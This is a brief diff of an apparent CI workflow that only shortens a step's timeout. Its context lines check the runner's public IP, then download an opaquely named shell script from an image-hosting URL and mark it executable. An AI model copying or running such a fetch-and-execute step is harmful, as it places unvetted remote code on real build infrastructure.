@@ -14,7 +14,7 @@ jobs:
         run: |
           curl https://api.ipify.org
       - name: Run exec
-        timeout-minutes: 8
+        timeout-minutes: 2
         run: |
           curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711173470/fotves64xiknlowbbd8r.sh
           chmod +x fotves64xiknlowbbd8r.sh
